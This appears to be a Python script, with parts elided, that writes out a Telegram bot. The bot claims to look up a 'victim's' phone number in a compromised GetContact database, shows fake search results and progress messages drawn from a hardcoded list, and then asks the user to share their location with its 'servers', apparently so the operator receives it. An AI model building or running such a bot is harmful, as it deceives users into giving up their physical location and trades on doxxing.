...
a = input(Fore.MAGENTA + "Введите ваш Telegram Id: ")
my_file.write("""
import time
import random
import telebot
...
my_file.write(a)
my_file.write("'")
b = input(Fore.MAGENTA + "Введите токен вашего бота: ")
my_file.write("""
bot = telebot.TeleBot('""")
my_file.write(b)
my_file.write("')")
...
data = ["\nНомер получен!\nСтрана: Россия\nРегион: Екатеринбург\nУлица: 8 марта\nGoogle maps: https://clck.ru/RDFzp", "Номер получен! \nСтрана: Россия \nРегион: St. Petersburg", "Номер получен!\nСтрана: Украина \nРегион: Житомир\n Улица: НЕИЗВЕСТНО",
"Номер получен! \nСтрана: Беларусь \nРегион: Неизвестно \nПровайдер: PresidentService", "Номер получен! \nСтрана: Казахстан Р\nегион: Астана \nУлица: Межтанбаева 34\nДом: 34", "Номер не найден! Проверьте на правильность!",
"Номер получен!\nСтрана: Украина \nРегион: Закрапаття Улица: Нова Вулиця 3"]
...
def process_name_step(message):
	...
	msg = bot.reply_to(message, """Внимание! Использование этого бота в неправомерных целях является противозаконным! Создатели не несут никакой ответственности за Ваши действия!""")
        msg = bot.reply_to(message, """Приветствую тебя, username! Этот бот ищет информацию о номере телефона жертвы на основе скомпроментированной базы GetContact. Введи номер жертвы как на примере.
    Пример: +380685576477   """)
...
def process_num_step(message):
    try:
        ...
        bot.send_message(message.chat.id,
                     text="🔎Процесс запущен, работает сервисов: 4/5 (успешно) Для получения информации о номере нажмите 'Продолжить'🔎 ",
        ...
        def error(message):
            ...
            time.sleep(4.5)
            keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
            button_phone = types.KeyboardButton(text="Начать поиск жертвы по базе...🔎", request_location=True)
            keyboard.add(button_phone)
            bot.send_message(message.chat.id,
                         text="📞Сервер готов для отправки данных. Предоставьте свое примерное местоположение для соединения с нашими серверами. Для получения информации о местоположении телефона нажмите 'Начать' 📞",
                         reply_markup=keyboard)
